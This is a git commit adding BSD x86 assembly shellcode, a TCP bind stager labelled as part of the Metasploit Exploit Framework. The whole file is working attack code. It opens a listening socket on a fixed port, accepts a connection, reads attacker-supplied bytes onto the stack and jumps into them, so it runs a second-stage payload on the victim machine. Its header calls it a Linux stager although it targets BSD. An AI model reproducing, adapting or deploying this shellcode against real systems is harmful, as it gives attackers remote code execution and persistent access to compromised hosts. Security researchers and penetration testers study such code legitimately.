ea267a8ca2845818561a812962dec44f00ca7a56
Matt Miller <mmiller@hick.org>
2004-11-14 07:29:17 +0000

    bind stager

---
+++ src/shellcode/bsd/ia32/stager_sock_bind.asm
@@ -0,0 +1,74 @@
+;;
+; 
+;        Name: stager_sock_bind
+;   Qualities: Can Have Nulls
+;   Platforms: BSD
+;     Authors: skape <mmiller [at] hick.org>
+;     Version: $Revision$
+;     License: 
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Implementation of a Linux portbind TCP stager.
+;
+;;
+BITS   32
+GLOBAL main
+
+main:
+
+socket:
+	push byte 97
+	pop  eax
+	cdq
+	push edx
+	push word 0xbfbf
+	o16 push byte 0x2
+	mov  ecx, esp
+
+	push edx
+	inc  edx
+	push edx
+	inc  edx
+	push edx
+	push byte 0x10
+	int  0x80
+	xchg eax, ebx
+
+bind:
+	push ecx
+	push ebx
+	push edx
+	push byte 104
+	pop  eax
+	int  0x80
+
+listen:
+	mov  al, 106
+	int  0x80
+
+accept:
+	push edx
+	push ebx
+	mov  dh, 0x10
+	push edx
+	mov  al, 30
+	int  0x80
+
+read:
+	push ecx
+	push eax
+	push ecx
+%ifdef FD_REG_EBX
+	xchg eax, ebx
+%else
+	xchg eax, edi
+%endif
+	push byte 0x3
+	pop  eax
+	int  0x80
+	ret
